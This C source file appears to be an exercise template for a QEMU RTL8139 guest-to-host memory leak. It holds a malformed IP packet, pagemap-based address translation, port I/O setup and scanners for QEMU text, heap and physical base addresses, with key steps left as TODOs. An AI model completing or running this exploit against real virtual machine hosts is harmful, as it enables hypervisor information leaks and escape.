/*
Copyright (c) 2016, Mehdi Talbi, Paul Fariello
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice,
this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright
notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
contributors may be used to endorse or promote products derived from this
software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.
*/

#include <sys/io.h>
#include <sys/mman.h>

#include <arpa/inet.h>
#include <assert.h>
#include <err.h>
#include <fcntl.h>
#include <inttypes.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

//#include "qemu.h"

#define PAGE_SHIFT      12
#define PAGE_SIZE       (1 << PAGE_SHIFT)
#define PFN_PRESENT     (1ull << 63)
#define PFN_PFN         ((1ull << 55) - 1)
#define PHY_RAM         0x80000000

#define page_aligned __attribute__((aligned(PAGE_SIZE)))
#define offsetof(st, m) __builtin_offsetof(st, m)

#define LEAK_MAX 0x2000

#define CHUNK_SIZE_MASK ~7ull

#define NMEMB(a) sizeof(a)/sizeof(a[0])

typedef uint64_t hptr_t;
#define HNULL ((hptr_t)0x0)
#define PRIxHPTR PRIx64
typedef uint64_t hsize_t;

#define RTL8139_BUFFER_SIZE 1514

#define PCNET_PORT   0xc100


/*
	TODO 1: Find I/O port woth lspci -vv command
*/
#define RTL8139_PORT 0xc000

#define CP_RX_OWN              (1<<31)
#define CP_RX_EOR              (1<<30)
#define CP_RX_BUFFER_SIZE_MASK ((1<<13) - 1)

#define CP_TX_OWN              (1<<31)
#define CP_TX_EOR              (1<<30)
#define CP_TX_FS               (1<<29)
#define CP_TX_LS               (1<<28)
#define CP_TX_LGSEN            (1<<27)
#define CP_TX_IPCS             (1<<18)
#define CP_TX_UDPCS            (1<<17)
#define CP_TX_TCPCS            (1<<16)
#define CP_TX_BUFFER_SIZE      (1<<16)
#define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)

enum RTL8139_registers {
	TxAddr0      = 0x20, /* Tx descriptors (also four 32bit). */
	ChipCmd      = 0x37,
	TxConfig     = 0x40,
	RxConfig     = 0x44,
	TxPoll       = 0xD9, /* tell chip to check Tx descriptors for work */
	CpCmd        = 0xE0, /* C+ Command register (C+ mode only) */
	RxRingAddrLO = 0xE4, /* 64-bit start addr of Rx ring */
	RxRingAddrHI = 0xE8, /* 64-bit start addr of Rx ring */
};

enum RTL8139_TxPollBits {
	CPlus = 0x40,
};

enum RT8139_ChipCmdBits {
	CmdReset   = 0x10,
	CmdRxEnb   = 0x08,
	CmdTxEnb   = 0x04,
	RxBufEmpty = 0x01,
};

enum RTL_8139_CplusCmdBits {
	CPlusRxVLAN   = 0x0040, /* enable receive VLAN detagging */
	CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */
	CPlusRxEnb    = 0x0002,/*Receive Enable in c+ mod*/
	CPlusTxEnb    = 0x0001,/*Transmit Enable in c+ mod*/
};

enum RTL_8139_tx_config_bits {
	TxLoopBack = (1 << 18) | (1 << 17), /* enable loopback test mode */
	/*...*/
};

enum RTL_8139_rx_mode_bits {
	AcceptErr       = 0x20,
	AcceptRunt      = 0x10,
	AcceptBroadcast = 0x08,
	AcceptMulticast = 0x04,
	AcceptMyPhys    = 0x02,
	AcceptAllPhys   = 0x01,
	Wrap            = 0x80,
	MxDMA256        = 0x400,
	RbLen64         = 0x1800,
	RxFTh512        = 0xa000,
};

struct rtl8139_desc {
	uint32_t dw0;
	uint32_t dw1;
	uint32_t buf_lo;
	uint32_t buf_hi;
};

struct rtl8139_ring {
	struct rtl8139_desc *desc;
	void                *buffer;
};

/* malformed ip packet with corrupted header size */
static uint8_t rtl8139_packet [] = {
	0x52, 0x54, 0x00, 0x12, 0x34, 0x57, 0x52, 0x54, 0x00, 0x12, 0x34,
	0x57, 0x08, 0x00, 0x45, 0x00, 0x00, 0x13, 0xde, 0xad, 0x40, 0x00,
	0x40, 0x06, 0xde, 0xad, 0xc0, 0x08, 0x01, 0x01, 0xc0, 0xa8, 0x01,
	0x02, 0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe, 0xca, 0xfe,
	0xba, 0xbe, 0x50, 0x10, 0xde, 0xad, 0xde, 0xad, 0x00, 0x00
};

static int fd = -1;

hptr_t phy_mem = 0;

/*
 ** taken from virtunoid.c
 ** adress translation utilities
 **/
uint32_t page_offset(uint32_t addr)
{
	return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr)
{
	uint64_t pme, gfn;
	size_t offset;
	offset = ((uintptr_t)addr >> 9) & ~7;
	lseek(fd, offset, SEEK_SET);
	read(fd, &pme, 8);
	if (!(pme & PFN_PRESENT))
		return -1;
	gfn = pme & PFN_PFN;
	return gfn;
}

uint64_t gva_to_gpa(void *addr)
{
	uint64_t gfn = gva_to_gfn(addr);
	assert(gfn != -1);
	return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

hptr_t gva_to_hva(void *addr)
{
		return gva_to_gpa(addr) + phy_mem;
}

int cmp_page_offset(const void *a, const void *b)
{
	return page_offset(*(hptr_t *)a) - page_offset(*(hptr_t *)b);
}

/* dump packet content in xxd style */
void xxd(void *ptr, size_t size)
{
	size_t i;
	for (i = 0; i < size; i++) {
		if (i % 16 == 0) printf("\n0x%016x: ", ptr+i);
		printf("%02x", *(uint8_t *)(ptr+i));
		if (i % 16 != 0 && i % 2 == 1) printf(" ");
	}
	printf("\n");
}

uint64_t searchTextBase(void *ptr, size_t size)
{
	size_t i;
	int j;
	int g;
	int tmp;
	uint64_t tmp_ret;
	uint64_t value;
	bool flag = 0;


	/*
	TODO 3 Find text address offset
	*/
    uint64_t guess[2] = {};
	uint64_t ans = 0;

	for (i = 0; i < size-8; i += 8)
	{
		for(g=0; g<2; g++)
		{
			value = 0;
			for ( j = 0; j < 8; j++)
			{
				uint64_t t = *(uint8_t*)(ptr + i + j);
				value += (t << (j*8));
			}
			if( (((value & 0xfffff00000000000) == 0x500000000000) || ((value & 0xfffff00000000000) == 0x600000000000))
			&& (( (value - guess[g]) & 0xfff) == 0) )
			{
				flag = 1;
				//printf("0x%llx\n", value);
				tmp = g;
				tmp_ret = value;
				break;
			}
			value = 0;
			for ( j = 4; j < 12; j++)
			{
				uint64_t t = *(uint8_t*)(ptr + i + j);
				value += (t << (j*8));
			}
			if( (((value & 0xfffff00000000000) == 0x500000000000) || ((value & 0xfffff00000000000) == 0x600000000000))
			&& (( (value - guess[g]) & 0xfff) == 0) )
			{
				flag = 1;
				//printf("0x%llx\n", value);
				tmp = g;
				tmp_ret = value;
				break;
			}
		}
	}
	if(flag){
		//xxd(ptr, RTL8139_BUFFER_SIZE);
		ans = tmp_ret - guess[tmp];
		printf("Base address of qemu text: 0x%llx\n", ans);
	}
	return ans;
}

uint64_t searchPhyBase(void *ptr, size_t size)
{
	size_t i;
	int j;
	uint64_t value, ans = 0;
	bool flag = 0;
	for (i = 0; i < size-8; i += 8)
	{
		value = 0;
		for ( j = 0; j < 8; j++)
		{
			uint64_t t = *(uint8_t*)(ptr + i + j);
			value += (t << (j*8));
		}
		if((value & 0xfffff00000000000) == 0x700000000000)
		{
			flag = 1;
			//printf("0x%llx\n", value);
			ans = value & 0xffffffffff000000;
			ans -= 0x80000000;
			break;
		}
		
	}
	if(flag){
		printf("Physical Base of Virtual Memory in Guest: 0x%llx\n", ans);
		return ans;
	}
	else
		return 0;
}

uint64_t searchHeapBase(void *ptr, size_t size, uint64_t textBase)
{
	size_t i;
	int j;
	uint64_t value, ans = 0;
	bool flag = 0;

	/*
	TODO 4 Find Heap address offset. 
	*/
	uint64_t target_offset[6] = {};
	for (i = 0; i < size-8; i += 8)
	{
		value = 0;
		for ( j = 0; j < 8; j++)
		{
			uint64_t t = *(uint8_t*)(ptr + i + j);
			value += (t << (j*8));
		}
		if((value & 0xffff00000000) == (textBase & 0xffff00000000) && value!=0)
		{	
			if( (value - textBase) > 0x691000)
			{				
			    for(j = 0; j < 6; j++)
			    {
				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
					    ans = value -target_offset[j];
					    flag = 1;
					    break;
				    }
			    }
			}
		}
		value = 0;
		for ( j = 4; j < 12; j++)
		{
			uint64_t t = *(uint8_t*)(ptr + i + j);
			value += (t << (j*8));
		}
		if((value & 0xffff00000000) == (textBase & 0xffff00000000) && value!=0)
		{	
			if( (value - textBase) > 0x691000)
			{				
			    for(j = 0; j < 6; j++)
			    {
				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
					    ans = value -target_offset[j];
					    flag = 1;
					    break;
				    }
			    }
			}
		}
		value = 0;
		for ( j = 8; j < 16; j++)
		{
			uint64_t t = *(uint8_t*)(ptr + i + j);
			value += (t << (j*8));
		}
		if((value & 0xffff00000000) == (textBase & 0xffff00000000) && value!=0)
		{	
			if( (value - textBase) > 0x691000)
			{				
			    for(j = 0; j < 4; j++)
			    {
				    if(((value -target_offset[j])&0xfff) == 0 && !flag){
					    ans = value -target_offset[j];
					    flag = 1;
					    break;
				    }
			    }
			}
		}
		if(flag)
			break;
		
	}
	if(flag){
		printf("Base Address of Heap Address: 0x%llx\n", ans);
		return ans;
	}
	else
		return 0;
}
/* RTL8139 primitives */
void rtl8139_card_config()
{
	outl(TxLoopBack, RTL8139_PORT + TxConfig);
	outl(AcceptMyPhys, RTL8139_PORT + RxConfig);
	outw(CPlusRxEnb|CPlusTxEnb, RTL8139_PORT + CpCmd);
	outb(CmdRxEnb|CmdTxEnb, RTL8139_PORT + ChipCmd);
}

void rtl8139_desc_config_tx(struct rtl8139_desc *desc, void *buffer)
{
	uint32_t addr;

	memset(desc, 0, sizeof(struct rtl8139_desc));
	desc->dw0 |= CP_TX_OWN | CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN |
	             CP_TX_IPCS | CP_TX_TCPCS;
	desc->dw0 += RTL8139_BUFFER_SIZE;

	addr =  (uint32_t)gva_to_gpa(buffer);
	desc->buf_lo = addr;

	addr = (uint32_t)gva_to_gpa(desc);

	printf("[-] phys addr of TxRing is: %p\n", addr);
	outl(addr, RTL8139_PORT + TxAddr0);
	outl(0x0, RTL8139_PORT + TxAddr0 + 0x4);
}

void rtl8139_desc_config_rx(struct rtl8139_ring *ring,
                            struct rtl8139_desc *desc, int nb)
{
	uint32_t addr;
	size_t i;
	for (i = 0; i < nb; i++) {
		ring[i].desc = &desc[i];
		memset(ring[i].desc, 0, sizeof(struct rtl8139_desc));

		ring[i].buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);
		memset(ring[i].buffer, 0, RTL8139_BUFFER_SIZE);

		addr = (uint32_t)gva_to_gpa(ring[i].buffer);

		ring[i].desc->dw0 |= CP_RX_OWN;
		if (i == nb - 1)
			ring[i].desc->dw0 |= CP_RX_EOR;
		ring[i].desc->dw0 &= ~CP_RX_BUFFER_SIZE_MASK;
		ring[i].desc->dw0 |= USHRT_MAX;
		ring[i].desc->buf_lo = addr;
	}

	addr = (uint32_t)gva_to_gpa(desc);
	printf("[-] phys addr of RxRing is: %p\n", addr);

	outl(addr, RTL8139_PORT + RxRingAddrLO);
	outl(0x0, RTL8139_PORT + RxRingAddrHI);
}

void rtl8139_packet_send(void *buffer, void *packet, size_t len)
{
	if (len <= RTL8139_BUFFER_SIZE) {
		memcpy(buffer, packet, len);
		outb(CPlus, RTL8139_PORT + TxPoll);
	}
}

int main()
{
	struct rtl8139_ring *rtl8139_rx_ring;
	struct rtl8139_desc *rtl8139_rx_desc, rtl8139_tx_desc;
	void *rtl8139_tx_buffer;
	static const int rtl8139_rx_nb = 44;

	void *addr;
	hptr_t text, mprotect_addr, qemu_set_irq_addr;

	void *leak[LEAK_MAX];
	size_t nb_leak = 0;
	int score;

	fd = open("/proc/self/pagemap", O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

	rtl8139_rx_ring = calloc(rtl8139_rx_nb, sizeof(struct rtl8139_ring));
	rtl8139_rx_desc = aligned_alloc(PAGE_SIZE, sizeof(struct rtl8139_desc) * rtl8139_rx_nb);
	rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);

	iopl(3);

	/*
	TODO 5 Fill out poc code to reach the vuln function `static int rtl8139_cplus_transmit_one(RTL8139State *s)` 
	*/

	sleep(2);

	/* dump packet content in xxd style */
	size_t i;
	uint64_t textBaseAddr = 0;
	uint64_t phyBaseAddr = 0;
	uint64_t heapBaseAddr = 0;
	for (i = 0; i < rtl8139_rx_nb; i++)
		xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
	//for (i = 0; i < rtl8139_rx_nb; i++)
	//{
	//	textBaseAddr = searchTextBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
	//	if(textBaseAddr != 0)
	//		break;
	//}
	//for (i = 0; i < rtl8139_rx_nb; i++)
	//{
	//	phyBaseAddr = searchPhyBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);
	//	if(phyBaseAddr != 0)
	//		break;
	//}
	//for (i = 0; i < rtl8139_rx_nb; i++)
	//{
	//	heapBaseAddr = searchHeapBase(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE, textBaseAddr);
	//	if(heapBaseAddr != 0)
	//		break;
	//}
}
